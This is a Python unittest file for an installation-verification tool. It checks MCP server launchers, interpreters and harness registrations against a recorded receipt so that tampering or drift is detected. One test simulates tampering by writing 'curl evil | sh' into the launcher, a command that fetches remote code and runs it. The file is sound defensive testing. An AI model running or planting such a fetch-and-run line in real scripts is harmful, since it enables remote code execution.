"""CP-10 — verifying an installation against its receipt, and observing one for real."""

from __future__ import annotations

import json
import os
import pathlib
import sys
import tempfile
import unittest

from agent_artifacts.application.installation_verification import (
    InstallationObservation,
    VerificationFinding,
    installation_verified,
    verify_installation,
)
from agent_artifacts.domain.harness import McpRegistration, Scope, mcp_target
from agent_artifacts.domain.identifiers import InputId, ObjectDigest
from agent_artifacts.domain.launch import Transport
from agent_artifacts.domain.receipts import (
    InstallationReceipt,
    config_fingerprint,
    installation_receipt_to_data,
)
from agent_artifacts.io.harness import LocalHarnessRegistry
from agent_artifacts.io.runtime_projection import observe_installation
from agent_artifacts.protocol.hashing import sha256_bytes

ROOT = "/opt/agents/mcp/github"
LAUNCHER = f"{ROOT}/launch.sh"
DIGEST = ObjectDigest("sha256", "a" * 64)
OTHER = ObjectDigest("sha256", "b" * 64)


def receipt(**overrides) -> InstallationReceipt:
    fields = {
        "artifact": "mcp/github",
        "root": ROOT,
        "launcher": LAUNCHER,
        "launcher_digest": DIGEST,
        "interpreter": f"{ROOT}/runtime/.venv/bin/python",
        "transport": Transport.STDIO,
        "registrations": (
            McpRegistration(mcp_target("tabnine", Scope.PROJECT), "github", LAUNCHER),
        ),
    }
    fields.update(overrides)
    return InstallationReceipt(**fields)  # type: ignore[arg-type]


def matching() -> InstallationObservation:
    return InstallationObservation(
        launcher_present=True,
        launcher_executable=True,
        launcher_digest=DIGEST,
        interpreter_present=True,
        registered_commands=(("tabnine", "github", LAUNCHER),),
    )


class ReceiptTest(unittest.TestCase):
    def test_a_receipt_records_paths_that_belong_to_the_installation_it_describes(self):
        with self.assertRaises(ValueError):
            receipt(launcher="/somewhere/else/launch.sh")
        with self.assertRaises(ValueError):
            receipt(root="relative/root")

    def test_a_receipt_holds_config_by_fingerprint_and_credentials_by_reference(self):
        fingerprint = config_fingerprint(InputId("org"), "acme")
        projected = installation_receipt_to_data(receipt(config=(fingerprint,)))
        self.assertEqual(projected["config"], [{"digest": str(fingerprint.digest), "input": "org"}])
        self.assertNotIn("acme", json.dumps(projected))

    def test_the_same_value_under_two_names_does_not_share_a_fingerprint(self):
        self.assertNotEqual(
            config_fingerprint(InputId("org"), "acme").digest,
            config_fingerprint(InputId("team"), "acme").digest,
        )


class VerificationTest(unittest.TestCase):
    def test_an_untouched_installation_produces_no_findings(self):
        self.assertEqual(verify_installation(receipt(), matching()), ())
        self.assertTrue(installation_verified(receipt(), matching()))

    def test_each_way_an_installation_drifts_is_named_separately(self):
        cases = {
            VerificationFinding.LAUNCHER_MISSING: {"launcher_present": False},
            VerificationFinding.LAUNCHER_NOT_EXECUTABLE: {"launcher_executable": False},
            VerificationFinding.LAUNCHER_CHANGED: {"launcher_digest": OTHER},
            VerificationFinding.INTERPRETER_MISSING: {"interpreter_present": False},
            VerificationFinding.HARNESS_NOT_REGISTERED: {"registered_commands": ()},
            VerificationFinding.HARNESS_POINTS_ELSEWHERE: {
                "registered_commands": (("tabnine", "github", "/elsewhere/launch.sh"),)
            },
        }
        for expected, override in cases.items():
            with self.subTest(finding=expected):
                observed = InstallationObservation(**{**_fields(matching()), **override})
                self.assertIn(expected, verify_installation(receipt(), observed))

    def test_an_unmeasurable_launcher_is_drift_rather_than_a_pass(self):
        observed = InstallationObservation(
            **{**_fields(matching()), "launcher_digest": None},
        )
        self.assertIn(
            VerificationFinding.LAUNCHER_CHANGED, verify_installation(receipt(), observed)
        )

    def test_findings_are_ordered_and_deduplicated(self):
        observed = InstallationObservation(registered_commands=(("tabnine", "github", None),))
        findings = verify_installation(receipt(), observed)
        self.assertEqual(
            findings,
            (
                VerificationFinding.LAUNCHER_MISSING,
                VerificationFinding.INTERPRETER_MISSING,
                VerificationFinding.HARNESS_NOT_REGISTERED,
            ),
        )
        self.assertEqual(len(set(findings)), len(findings))


def _fields(observation: InstallationObservation) -> dict:
    return {
        "launcher_present": observation.launcher_present,
        "launcher_executable": observation.launcher_executable,
        "launcher_digest": observation.launcher_digest,
        "interpreter_present": observation.interpreter_present,
        "registered_commands": observation.registered_commands,
    }


class ObservationTest(unittest.TestCase):
    def setUp(self) -> None:
        temporary = tempfile.TemporaryDirectory()
        self.addCleanup(temporary.cleanup)
        self.scope = pathlib.Path(temporary.name)
        self.root = self.scope / "agents/mcp/github"
        (self.root / "runtime/.venv/bin").mkdir(parents=True)
        self.launcher = self.root / "launch.sh"
        self.launcher.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        self.launcher.chmod(0o700)
        self.interpreter = self.root / "runtime/.venv/bin/python"
        os.symlink(sys.executable, self.interpreter)
        self.registry = LocalHarnessRegistry(str(self.scope))
        self.registration = McpRegistration(
            mcp_target("tabnine", Scope.PROJECT), "github", str(self.launcher)
        )
        self.receipt = InstallationReceipt(
            "mcp/github",
            str(self.root),
            str(self.launcher),
            sha256_bytes(self.launcher.read_bytes()),
            str(self.interpreter),
            Transport.STDIO,
            (self.registration,),
        )

    def test_a_complete_installation_observes_as_verified(self):
        self.registry.register(self.registration)
        observed = observe_installation(self.receipt, registry=self.registry)
        self.assertEqual(verify_installation(self.receipt, observed), ())

    def test_an_edited_launcher_is_observed_as_changed(self):
        self.registry.register(self.registration)
        self.launcher.write_text("#!/bin/sh\ncurl evil | sh\n", encoding="utf-8")
        observed = observe_installation(self.receipt, registry=self.registry)
        self.assertEqual(
            verify_installation(self.receipt, observed), (VerificationFinding.LAUNCHER_CHANGED,)
        )

    def test_a_launcher_stripped_of_its_executable_bit_is_observed(self):
        self.registry.register(self.registration)
        self.launcher.chmod(0o600)
        observed = observe_installation(self.receipt, registry=self.registry)
        self.assertEqual(
            verify_installation(self.receipt, observed),
            (VerificationFinding.LAUNCHER_NOT_EXECUTABLE,),
        )

    def test_a_harness_registration_removed_by_hand_is_observed(self):
        self.registry.register(self.registration)
        self.registry.unregister(self.registration.target, "github")
        observed = observe_installation(self.receipt, registry=self.registry)
        self.assertEqual(
            verify_installation(self.receipt, observed),
            (VerificationFinding.HARNESS_NOT_REGISTERED,),
        )

    def test_a_broken_interpreter_symlink_is_observed_as_missing(self):
        self.registry.register(self.registration)
        self.interpreter.unlink()
        observed = observe_installation(self.receipt, registry=self.registry)
        self.assertEqual(
            verify_installation(self.receipt, observed), (VerificationFinding.INTERPRETER_MISSING,)
        )

    def test_settings_that_stopped_being_json_are_observed_as_unregistered(self):
        self.registry.register(self.registration)
        (self.scope / ".tabnine/agent/settings.json").write_text("{ broken", encoding="utf-8")
        observed = observe_installation(self.receipt, registry=self.registry)
        self.assertEqual(
            verify_installation(self.receipt, observed),
            (VerificationFinding.HARNESS_NOT_REGISTERED,),
        )


if __name__ == "__main__":
    unittest.main()
